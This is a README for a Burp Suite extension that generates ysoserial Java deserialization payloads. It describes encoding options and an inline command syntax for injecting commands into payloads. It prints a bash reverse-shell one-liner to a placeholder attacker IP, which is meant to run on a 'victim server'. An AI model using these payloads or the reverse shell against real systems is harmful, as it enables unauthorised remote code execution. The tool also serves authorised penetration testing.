# burp-ysoserial - with complex command in injection support


There are 3 ways to run this extension. 

 1. Generate a payload from the menu above. You can then copy and paste it into other tabs in burp.
 1. Generate a payload from the menu above. In another tab you can select the text you want to replace and right click. You have 3 options to replace.
   1. Raw - This will replace your selected text with an unencoded version of the payload. This is raw binary/hex.
   1. B64 - This payload will replace your selected text with a base64 encoded version.
   1. URLEnc - This will replace your selected text with a URL encoded and base64 encoded payload. Ideal for web type applications
 1. You can use inline commands to replace your text with a payload that contains your command. For example you can enter text in repeater like:
 
 ```$(CC1|ping -c1 8.8.8.8)```
 
 Select the above text and right click any of the Java Serialized Payload Options and it will replace your command with a payload containing that command.
 
## Complex Commands (i.e. pipes and I/O redirection)
Note ysoserial in this extension has been updated to accept more complicated commands that in the original. For instance commands the following command would fail to execute on the victim server:
 
```echo test > /tmp/text.txt```
  or
```bash -c "echo test > /tmp/text.txt"```
 
This is because to run complex commands that pipe command into other commands in java the arguments needs to be a string Array. This version of ysoserial has been modifiedby using a delimter of ",,". to seperate your arguments to the string array.  Here is an example of running a more complicated command using this method to get a reverse shell: 
  
 ```/bin/bash,,-c,,bash -i >& /dev/tcp/X.X.X.X/9997 0>&1```
 
The above code will be split into a string array that java can run on the victim server. :) The resulting java code would look like:
```Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/X.X.X.X/9997 0>&1"});```
